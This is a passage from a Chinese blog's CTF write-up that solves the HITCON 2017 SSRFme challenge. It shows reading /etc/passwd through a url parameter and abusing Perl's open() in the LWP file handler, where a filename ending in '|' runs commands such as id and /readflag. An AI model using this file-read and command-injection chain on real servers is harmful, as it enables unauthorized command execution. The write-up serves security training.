class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>pathinfo例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(pathinfo(<span class="string">"/testweb/test.txt"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">[dirname] =&gt; /testweb</span><br><span class="line">[basename] =&gt; test.txt</span><br><span class="line">[extension] =&gt; txt</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>basename() 函数返回路径中的文件名部分<br>写个例子简单测试一下最终是将文件写入哪个文件夹的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'$info='</span>.$info;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'$dir='</span>.$dir;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'basename($info["basename"])='</span>.basename($info[<span class="string">"basename"</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589618257419.png" alt="1589618257419"></p>
<p>可以看到是写入输入路径的<code>basename</code>中，所以直接</p>
<p>解题思路<br>首先会先进入<code>sandbox/.md5(orange110.187.162.194)</code>文件夹也就是<code>sandbox/431d3eac52ea5609413b3e82cb792bf3</code>，然后执行一个“GET +我们传入的url参数” 这个命令。最后把执行的命令写入我们传入以我们传入的filename为文件名的文件内</p>
<p>我们可以读取文件</p>
<blockquote>
<p>?url=/etc/passwd&amp;filename=a</p>
<p>sandbox/431d3eac52ea5609413b3e82cb792bf3/a</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589619733626.png" alt="1589619733626"></p>
<blockquote>
<p>?url=/&amp;filename=b</p>
<p>sandbox/431d3eac52ea5609413b3e82cb792bf3/b</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589619779798.png" alt="1589619779798"></p>
<p>发现了一个readflag，一般都是需要执行它来得到flag</p>
<p>这里还有一个<strong>GET的命令执行漏洞</strong><br>perl的feature，在open下可以执行命令。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  test cat test.pl</span><br><span class="line">open(FD, <span class="string">"whoami|"</span>);</span><br><span class="line"><span class="keyword">print</span> &lt;FD&gt;;</span><br><span class="line">➜  test perl test.pl</span><br><span class="line">moxiaoxi</span><br><span class="line">➜  test</span><br></pre></td></tr></table></figure>

<p>在open下，如果perl的第二个参数（path）可控，我们就能进行任意代码执行。</p>
<p>而GET对协议处理部分调用的是 <code>/usr/share/perl5/LWP/Protocol</code>下的各个pm模块，通过查询可以发现在file.pm中，path参数是完全可控的。</p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># URL OK, look at file</span></span><br><span class="line">my $path  = $url-&gt;file;</span><br><span class="line"></span><br><span class="line"><span class="comment"># test file exists and is readable</span></span><br><span class="line">unless (-e $path) &#123;</span><br><span class="line"><span class="keyword">return</span> HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND,</span><br><span class="line">              <span class="string">"File `$path' does not exist"</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment"># read the file</span></span><br><span class="line"><span class="keyword">if</span> ($method ne <span class="string">"HEAD"</span>) &#123;</span><br><span class="line">open(F, $path) <span class="keyword">or</span> <span class="keyword">return</span> <span class="keyword">new</span></span><br><span class="line">    HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR,</span><br><span class="line">           <span class="string">"Cannot read file '$path': $!"</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里多了一个限制条件，就是file.pm会先判断文件是否存在。若存在，才会触发最终的代码执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  test GET <span class="string">'file:id|'</span></span><br><span class="line">➜  test touch <span class="string">'id|'</span></span><br><span class="line">➜  test GET <span class="string">'file:id|'</span></span><br><span class="line">uid=<span class="number">1000</span>(moxiaoxi) gid=<span class="number">1000</span>(moxiaoxi) groups=<span class="number">1000</span>(moxiaoxi),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">108</span>(lpadmin),<span class="number">124</span>(sambashare)</span><br></pre></td></tr></table></figure>

<p>那么，最终的payload就很简单了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 新建一个bash%20-c%20/readflag|文件</span><br><span class="line">?url=xxx&amp;filename=|/readflag</span><br><span class="line">2. open文件，并触发命令执行，执行readflag，并将数据写入flag</span><br><span class="line">/?url=file:|/readflag&amp;filename=flag</span><br><span class="line">3. 访问sandbox下的flag，获得flag</span><br><span class="line">/sandbox/431d3eac52ea5609413b3e82cb792bf3/flag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589620353999.png" alt="1589620353999"></p>
<p>参考文章：<a href="http://momomoxiaoxi.com/2017/11/08/HITCON/#ssrfme" target="_blank" rel="noopener">http://momomoxiaoxi.com/2017/11/08/HITCON/#ssrfme</a></p>

      
    </div>
    
    
    

    <div>
      
        
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

  <!-- JS库 sweetalert 可修改路径 -->
  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
  <span>最后更新:</span>2020年06月25日 20:06:13<br>
  <span>原始链接:</span><a href="/2020/05/16/BUU-web5/" title="BUU-web五">https://cyzcc.vip/2020/05/16/BUU-web5/</a><br>
  <span>版权声明:</span>转载请注明出处！<br>  
</div>

      
</div>
	
	

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>您的支持就是我的动力！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
        <p>Thanks</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    
      <div>
        
          <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
    
</div>

        
      </div>


    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/05/12/PHP_Code_Challenge/" rel="next" title="PHP_Code_Challenge">
                <i class="fa fa-chevron-left"></i> PHP_Code_Challenge
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/05/29/GKCTF--WHUCTF/" rel="prev" title="GKCTF&&WHUCTF">
                GKCTF&&WHUCTF <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="CyzCc" />
            
              <p class="site-author-name" itemprop="name">CyzCc</p>
              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">62</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
                      
                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
                      
                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
                      
                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
                      
                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
                      
                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
                      
                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
                      
                        <i class="fa fa-fw fa-globe"></i>Paper</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
                      
                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
                      
                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
                      
                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
                      
                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
                  </span>
                
            </div>
          

          
          

          
          

          <div id="days"></div>
<script>
function show_date_time(){
window.setTimeout("show_date_time()", 1000);
BirthDay=new Date("10/30/2019 15:13:14");
today=new Date();
timeold=(today.getTime()-BirthDay.getTime());
sectimeold=timeold/1000
secondsold=Math.floor(sectimeold);
msPerDay=24*60*60*1000
e_daysold=timeold/msPerDay
daysold=Math.floor(e_daysold);
e_hrsold=(e_daysold-daysold)*24;
hrsold=setzero(Math.floor(e_hrsold));
e_minsold=(e_hrsold-hrsold)*60;
minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
seconds=setzero(Math.floor((e_minsold-minsold)*60));
document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
}
function setzero(i){
if (i<10)
{i="0" + i};
return i;
}
show_date_time();
</script>

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2019-高明的黑客"><span class="nav-number">1.</span> <span class="nav-text">[强网杯 2019]高明的黑客</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#普通脚本"><span class="nav-number">1.1.</span> <span class="nav-text">普通脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多线程"><span class="nav-number">1.2.</span> <span class="nav-text">多线程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#De1CTF-2019-SSRF-Me"><span class="nav-number">2.</span> <span class="nav-text">[De1CTF 2019]SSRF Me</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">3.</span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-Pythonginx"><span class="nav-number">4.</span> <span class="nav-text">[SUCTF 2019]Pythonginx</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ASIS-2019-Unicorn-shop"><span class="nav-number">5.</span> <span class="nav-text">[ASIS 2019]Unicorn shop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SWPU2019-Web1"><span class="nav-number">6.</span> <span class="nav-text">[SWPU2019]Web1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#无列名注入"><span class="nav-number">6.1.</span> <span class="nav-text">无列名注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2019-Love-Math"><span class="nav-number">7.</span> <span class="nav-text">[CISCN 2019 ]Love Math</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="nav-number">8.</span> <span class="nav-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="nav-number">9.</span> <span class="nav-text">[BJDCTF2020]Cookie is so stable</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">10.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#V-amp-N2020-公开赛-HappyCTFd"><span class="nav-number">11.</span> <span class="nav-text">[V&amp;N2020 公开赛]HappyCTFd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#极客大挑战-2019-RCE-ME"><span class="nav-number">12.</span> <span class="nav-text">[极客大挑战 2019]RCE ME</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-EasyWeb"><span class="nav-number">13.</span> <span class="nav-text">[SUCTF 2019]EasyWeb</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GYCTF2020-FlaskApp"><span class="nav-number">14.</span> <span class="nav-text">[GYCTF2020]FlaskApp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HITCON-2017-SSRFme"><span class="nav-number">15.</span> <span class="nav-text">[HITCON 2017]SSRFme</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cyzCc</span>

 <!-- 
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">163.2k</span>
  

</div>

-->






<!-- 新增访客统计代码 -->
<!--<div class="busuanzi-count">
    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="site-uv">
      <i class="fa fa-user"></i>
      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
    </span>
    <div class="powered-by"></div>
    <span class="site-uv">
      <i class="fa fa-eye"></i>
      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
    </span>
    <!-- 博客字数统计 -->
    <span class="site-pv">
      <i class="fa fa-pencil"></i>
      博客全站共： <span class="post-count">163.2k</span> 字
    </span>
	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
</div>
<!-- 新增访客统计代码 END-->

        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>访问人数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
